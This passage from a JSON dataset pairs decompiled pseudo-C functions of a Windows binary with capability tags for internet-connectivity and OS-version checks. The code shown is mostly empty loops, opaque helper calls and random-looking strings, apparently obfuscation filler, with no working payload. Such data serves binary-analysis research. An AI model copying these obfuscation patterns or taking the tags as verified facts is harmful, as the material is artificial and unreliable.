        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __cdecl\nfcn.0040b10c(uint arg_8h, uint noname_1, uint arg_10h, uint noname_3, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint noname_7, uint arg_28h, uint arg_2ch)\n\n{\n    char cVar1;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_130h;\n    uint var_115h;\n    uint var_f9h;\n    uint var_ddh;\n    uint var_c1h;\n    uint var_a5h;\n    uint var_89h;\n    uint var_6dh;\n    uint var_51h;\n    uchar var_35h;\n    uint var_34h;\n    ulong uStack52;\n    ulong uStack44;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"ypivmjavyiqokhccaestwf\", &var_115h);\n    fcn.00483140();\n    uStack44 = *0x521f78;\n    uStack52 = *0x521f80;\n    var_34h = 0xb2e;\n    fcn.00483110();\n    fcn.004b21e0(\"ypivmjavyiqokhccaestwf\", &var_f9h);\n    fcn.00483110();\n    fcn.004b21e0(\"ypivmjavyiqokhccaestwf\", &var_ddh);\n    cVar1 = fcn.004c1070(&var_f9h + 1, &var_115h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x50; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"ypivmjavyiqokhccaestwf\", &var_c1h);\n    fcn.00483110();\n    fcn.004b21e0(\"ypivmjavyiqokhccaestwf\", &var_a5h);\n    cVar1 = fcn.004c1070(&var_c1h + 1, &var_ddh + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_10h = 0x33; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    for (var_14h = 0x54; 0 < var_14h; var_14h = var_14h + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"ypivmjavyiqokhccaestwf\", &var_89h);\n    fcn.00483110();\n    fcn.004b21e0(\"ypivmjavyiqokhccaestwf\", &var_6dh);\n    cVar1 = fcn.004c1070(&var_89h + 1, &var_a5h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_18h = 0x32; 0 < var_18h; var_18h = var_18h + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"ypivmjavyiqokhccaestwf\", &var_51h);\n    fcn.00483110();\n    fcn.004b21e0(\"ypivmjavyiqokhccaestwf\", &var_35h);\n    cVar1 = fcn.004c1070(&var_51h + 1, &var_6dh + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_1ch = 0x55; 0 < var_1ch; var_1ch = var_1ch + -1) {\n        }\n    }\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 1149
    },
    "0040b598": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040b598(uint noname_0, uint arg_ch, uint noname_2, uint noname_3, uint arg_18h)\n\n{\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_14h;\n    int32_t var_4h;\n    \n    for (var_4h = 0x1f; 0 < var_4h; var_4h = var_4h + -1) {\n    }\n    return 1;\n}\n",
        "token_count": 122
    },
    "0040c0e8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.0040c0e8(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    double dVar1;\n    char cVar2;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_8ch;\n    uint var_71h;\n    uint var_55h;\n    uint var_39h;\n    uint var_29h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"dblqsccfctjisnfggwkrzxzlbzdrlivbpisbyafkdzfdxvnfuszqxlefshhbqjuyrwudutotlgrjy\", &var_71h);\n    fcn.00483140();\n    var_18h = 0x508;\n    var_1ch = 0xbf;\n    stack0xffffffd4 = *0x522018;\n    var_29h._0_1_ = 0;\n    stack0xffffffc4 = *0x522020;\n    for (var_ch = 0x40; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"dblqsccfctjisnfggwkrzxzlbzdrlivbpisbyafkdzfdxvnfuszqxlefshhbqjuyrwudutotlgrjy\", &var_55h);\n    fcn.00483110();\n    fcn.004b21e0(\"dblqsccfctjisnfggwkrzxzlbzdrlivbpisbyafkdzfdxvnfuszqxlefshhbqjuyrwudutotlgrjy\", &var_39h);\n    cVar2 = fcn.004c1070(&var_55h + 1, &var_71h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    dVar1 = *0x522028;\n    if (cVar2 != '\\0') {\n        for (var_10h = 0x1e; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    for (var_14h = 0x12; 0 < var_14h; var_14h = var_14h + -1) {\n    }\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 697
    },
    "0040c2c6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.0040c2c6(uint noname_0, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h, uint noname_5, uint noname_6, \n            uint arg_24h)\n\n{\n    uint in_ECX;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_31h;\n    uint var_24h;\n    uint var_20h;\n    uchar var_1ah;\n    uint var_19h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    stack0xffffffe4 = *0x522030;\n    var_19h._0_1_ = 1;\n    var_1ah = 1;\n    var_20h = 0x4f7;\n    var_24h = 0xf44;\n    stack0xffffffcc = *0x522038;\n    for (var_ch = 0x2a; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"icobobgmz\", &var_31h);\n    fcn.00483140();\n    return in_ECX;\n}\n",
        "token_count": 328
    },
    "0040c378": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.0040c378(uint arg_8h, uint arg_ch)\n\n{\n    uint var_30h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_11h;\n    int32_t var_4h;\n    \n    for (var_4h = 0x2b; 0 < var_4h; var_4h = var_4h + -1) {\n    }\n    return *0x522048;\n}\n",
        "token_count": 108
    },
    "0040c4a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl fcn.0040c4a0(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    uint in_ECX;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar var_1ah;\n    uchar var_19h;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_18h = 0x104d;\n    var_19h = 1;\n    for (var_ch = 0x4d; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    for (var_10h = 0x4f; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    for (var_14h = 0x12; 0 < var_14h; var_14h = var_14h + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"nevuarunrdf\", &var_1ah);\n    fcn.00483140();\n    return in_ECX;\n}\n",
        "token_count": 299
    },
    "0040c54e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __fastcall fcn.0040c54e(uint param_1)\n\n{\n    uint var_7ch;\n    uint var_78h;\n    uint var_60h;\n    uint var_48h;\n    uint var_2eh;\n    uchar var_2ah;\n    uchar var_29h;\n    ulong uStack44;\n    uint var_1ch;\n    uchar var_15h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"adujgtfufinpnjmdyqczkaghnaqwscgcencmriimbishnajtlxcgdsltzjhlxvglfkxcoxanrwxtjkobiwqtqcbuocya\", \n                 &var_2eh);\n    fcn.00483140();\n    var_10h = 0x439;\n    fcn.00483110();\n    fcn.004b21e0(\"gfvsdujbocayjibjqxmcbpqypbkls\", &var_2eh + 1);\n    fcn.00483140();\n    var_14h = 0xf50;\n    fcn.00483110();\n    fcn.004b21e0(\"vmvocggmtmkebnblrkwxwspmjbfoxbmtakxuoqxgimmzagqmjzdxfbnlajqphor\", &var_2eh + 2);\n    fcn.00483140();\n    var_15h = 0;\n    var_1ch = 0xb73;\n    uStack44 = *0x522050;\n    var_29h = 0;\n    var_2ah = 1;\n    for (var_ch = 0x33; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"anfahkeejuyefw\", &var_2eh + 3);\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return param_1;\n}\n",
        "token_count": 518
    },
    "0040c928": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl\nfcn.0040c928(uint arg_8h, uint arg_ch, uint noname_2, uint noname_3, uint noname_4, uint arg_1ch, uint arg_20h)\n\n{\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_6ch;\n    uint var_60h;\n    uint var_48h;\n    uint var_2fh;\n    uint var_28h;\n    uint var_24h;\n    ulong uStack36;\n    uchar var_11h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_10h = 0x596;\n    var_11h = 1;\n    fcn.00483110();\n    fcn.004b21e0(\"anfjjumwplzcmaeofmhpxm\", &var_2fh);\n    fcn.00483140();\n    uStack36 = *0x522070;\n    var_24h = 0x1057;\n    var_28h = 0xfd6;\n    stack0xffffffd0 = 0x2e9;\n    var_2fh._2_1_ = 1;\n    fcn.00483110();\n    fcn.004b21e0(\"qwcifscffcrprlgpmdpvmojpphlh\", &var_2fh + 1);\n    fcn.00483140();\n    for (var_ch = 0x27; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    return 0;\n}\n",
        "token_count": 407
    },
    "0040ca46": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __cdecl fcn.0040ca46(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_bdh;\n    uint var_a1h;\n    uint var_85h;\n    uint var_69h;\n    uint var_4dh;\n    uint var_31h;\n    int32_t var_15h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"wiemfeugmywzrvmutfvabzkvcwthbtmpegryoggvbabgzcoiyhnvupnxekhqvhvkkcxwmybjvp\", &var_bdh);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"wiemfeugmywzrvmutfvabzkvcwthbtmpegryoggvbabgzcoiyhnvupnxekhqvhvkkcxwmybjvp\", &var_a1h);\n    fcn.00483110();\n    fcn.004b21e0(\"wiemfeugmywzrvmutfvabzkvcwthbtmpegryoggvbabgzcoiyhnvupnxekhqvhvkkcxwmybjvp\", &var_85h);\n    cVar1 = fcn.004c09a0(&var_a1h + 1, &var_bdh + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x50; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"wiemfeugmywzrvmutfvabzkvcwthbtmpegryoggvbabgzcoiyhnvupnxekhqvhvkkcxwmybjvp\", &var_69h);\n    fcn.00483110();\n    fcn.004b21e0(\"wiemfeugmywzrvmutfvabzkvcwthbtmpegryoggvbabgzcoiyhnvupnxekhqvhvkkcxwmybjvp\", &var_4dh);\n    cVar1 = fcn.004c1070(&var_69h + 1, &var_85h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_10h = 0x5c; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"wiemfeugmywzrvmutfvabzkvcwthbtmpegryoggvbabgzcoiyhnvupnxekhqvhvkkcxwmybjvp\", &var_31h);\n    fcn.00483110();\n    fcn.004b21e0(\"wiemfeugmywzrvmutfvabzkvcwthbtmpegryoggvbabgzcoiyhnvupnxekhqvhvkkcxwmybjvp\", &var_15h);\n    cVar1 = fcn.004c1070(&var_31h + 1, &var_4dh + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (stack0xffffffe8 = 0x29; 0 < stack0xffffffe8; unique0x00007a80 = stack0xffffffe8 + -1) {\n        }\n    }\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 956
    },
    "0040cd70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0040cd70(void)\n\n{\n    uint var_34h;\n    uint var_21h;\n    uint var_11h;\n    int32_t var_4h;\n    \n    for (var_4h = 0x5b; 0 < var_4h; var_4h = var_4h + -1) {\n    }\n    return 0x17a06;\n}\n",
        "token_count": 91
    },
    "0040cdbc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nfloat10 __cdecl\nfcn.0040cdbc(uint noname_0, uint noname_1, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint noname_6, \n            uint arg_24h, uint noname_8, uint arg_2ch, uint arg_30h)\n\n{\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_dh;\n    \n    for (stack0xfffffff0 = 0x42; 0 < stack0xfffffff0; unique0x00007a80 = stack0xfffffff0 + -1) {\n    }\n    return *0x522090;\n}\n",
        "token_count": 198
    },
    "0040ce20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __cdecl fcn.0040ce20(uint noname_0, uint noname_1, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    char cVar1;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f4h;\n    uint var_dch;\n    uint var_c4h;\n    uint var_ach;\n    uint var_94h;\n    uchar var_90h [27];\n    uint var_75h;\n    uint var_59h;\n    uint var_3dh;\n    uint var_21h;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"ozyljsvxxjfwzkxntbziovhajkhjemiosmikruujlvzattkuixmzqiurzendztxszyhpvicchqczzemdykp\", &var_94h);\n    fcn.00483140();\n    var_18h = 0x555;\n    fcn.00483110();\n    fcn.004b21e0(\"zojvqpxhhiuczzygypeldsiqzbcqlhlilfeataweculafqlestlrhlhxiktbcwaapmppnmdfvfldfzifksnkyseyxsehlrrjwn\", \n                 &var_94h + 1);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"xhsmdowmrwcdnwngfzesshbwqfmlbyunwwbxpsrejpom\", &var_94h + 2);\n    fcn.00483140();\n    stack0xffffffdc = *0x522098;\n    fcn.00483110();\n    fcn.004b21e0(0x51a119, &var_94h + 3);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"xhsmdowmrwcdnwngfzesshbwqfmlbyunwwbxpsrejpom\", &var_75h);\n    fcn.00483110();\n    fcn.004b21e0(\"xhsmdowmrwcdnwngfzesshbwqfmlbyunwwbxpsrejpom\", &var_59h);\n    cVar1 = fcn.004c1070(&var_75h + 1, var_90h);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x3b; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"ozyljsvxxjfwzkxntbziovhajkhjemiosmikruujlvzattkuixmzqiurzendztxszyhpvicchqczzemdykp\", &var_3dh);\n    fcn.00483110();\n    fcn.004b21e0(\"ozyljsvxxjfwzkxntbziovhajkhjemiosmikruujlvzattkuixmzqiurzendztxszyhpvicchqczzemdykp\", &var_21h);\n    cVar1 = fcn.004c09a0(&var_3dh + 1, &var_59h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_10h = 0x1c; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    for (var_14h = 0x26; 0 < var_14h; var_14h = var_14h + -1) {\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 1026
    },
    "0040d2a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint fcn.0040d2a0(void)\n\n{\n    uint var_5ch;\n    uint var_50h;\n    uint var_35h;\n    uchar var_2dh;\n    uint var_2ch;\n    ulong uStack44;\n    ulong uStack36;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_14h = 0x71e;\n    uStack36 = *0x5220a8;\n    uStack44 = *0x5220b0;\n    var_2ch = 0x409;\n    fcn.00483110();\n    fcn.004b21e0(\"xgqollpdoksjjedrscjinrfphsrefxwdinryztniorfpuzpaauwdwpstddnmraxmklzvwssdggfgvyjfbdrqhsketjapifqrvc\", \n                 &var_35h);\n    fcn.00483140();\n    var_2dh = 1;\n    stack0xffffffc8 = 0x13cc;\n    for (var_ch = 0x3c; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    for (var_10h = 0x25; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    fcn.004b2800();\n    return 0;\n}\n",
        "token_count": 351
    },
    "0040d35a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl\nfcn.0040d35a(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint noname_5, uint arg_20h, \n            uint arg_24h, uint arg_28h)\n\n{\n    double dVar1;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_30h;\n    uint var_15h;\n    uchar var_eh;\n    int32_t var_dh;\n    uint var_bp_4h;\n    \n    var_dh._0_1_ = 1;\n    fcn.00483110();\n    fcn.004b21e0(0x51a1a7, &var_15h);\n    fcn.00483140();\n    dVar1 = *0x5220b8;\n    var_eh = 0;\n    stack0xffffffe8 = 0x1423;\n    for (stack0xfffffff0 = 8; 0 < stack0xfffffff0; unique0x00007a80 = stack0xfffffff0 + -1) {\n    }\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 338
    },
    "0040d418": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d418(uint noname_0, uint noname_1, uint noname_2, uint arg_14h, uint arg_18h)\n\n{\n    uint var_40h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_28h;\n    uint var_21h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    for (var_4h = 0x5d; 0 < var_4h; var_4h = var_4h + -1) {\n    }\n    for (var_8h = 0x17; 0 < var_8h; var_8h = var_8h + -1) {\n    }\n    return;\n}\n",
        "token_count": 180
    },
    "0040e308": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040e308(uint arg_8h, uint arg_ch, uint noname_2, uint noname_3, uint noname_4, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch)\n\n{\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_5h;\n    \n    for (stack0xfffffff8 = 0x10; 0 < stack0xfffffff8; unique0x00007a80 = stack0xfffffff8 + -1) {\n    }\n    return;\n}\n",
        "token_count": 185
    },
    "0040e484": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __cdecl fcn.0040e484(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint var_148h;\n    uint var_144h;\n    uint var_13ch;\n    uint var_134h;\n    uint var_11ch;\n    uint var_104h;\n    uint var_ech;\n    uint var_d4h;\n    uchar var_d0h [27];\n    uint var_b5h;\n    uint var_99h;\n    uint var_7dh;\n    uint var_61h;\n    uint var_45h;\n    uint var_29h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(0x519e1c, &var_d4h);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"szmyxfgheksartcrnuqmztpedjszsnxbwlzlvprnwnstjswt\", &var_d4h + 1);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"lfunoxlgmblekbhisqqntwdxpgwwmjnhwtznlaznuoriugkpieqmruesaeyngjkwysrbcuxbogvgzfkikyctowoxzkqqahoz\", \n                 &var_d4h + 2);\n    fcn.00483140();\n    stack0xffffffd4 = *0x5221a0;\n    fcn.00483110();\n    fcn.004b21e0(0x51a6ad, &var_d4h + 3);\n    fcn.00483140();\n    for (var_ch = 0x3e; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(0x51a6ad, &var_b5h);\n    fcn.00483110();\n    fcn.004b21e0(0x51a6ad, &var_99h);\n    cVar1 = fcn.004c1070(&var_b5h + 1, var_d0h);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_10h = 0xf; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    for (var_14h = 0x5b; 0 < var_14h; var_14h = var_14h + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"lfunoxlgmblekbhisqqntwdxpgwwmjnhwtznlaznuoriugkpieqmruesaeyngjkwysrbcuxbogvgzfkikyctowoxzkqqahoz\", \n                 &var_7dh);\n    fcn.00483110();\n    fcn.004b21e0(\"lfunoxlgmblekbhisqqntwdxpgwwmjnhwtznlaznuoriugkpieqmruesaeyngjkwysrbcuxbogvgzfkikyctowoxzkqqahoz\", \n                 &var_61h);\n    cVar1 = fcn.004c09a0(&var_7dh + 1, &var_99h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_18h = 0x23; 0 < var_18h; var_18h = var_18h + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(0x519e1c, &var_45h);\n    fcn.00483110();\n    fcn.004b21e0(0x519e1c, &var_29h);\n    cVar1 = fcn.004c1070(&var_45h + 1, &var_61h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_1ch = 0xd; 0 < var_1ch; var_1ch = var_1ch + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 1173
    },
    "0040eb00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl\nfcn.0040eb00(uint arg_8h, uint arg_ch, uint noname_2, uint noname_3, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint noname_8, uint noname_9, uint noname_10, uint arg_34h, uint arg_38h)\n\n{\n    double dVar1;\n    char cVar2;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_cch;\n    uint var_c4h;\n    uint var_ach;\n    uint var_94h;\n    uint var_7ch;\n    uint var_64h;\n    uchar var_60h [27];\n    uint var_45h;\n    uchar var_29h;\n    uint var_28h;\n    uchar var_22h;\n    uint var_21h;\n    int32_t var_11h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_11h._0_1_ = 0;\n    stack0xffffffdc = 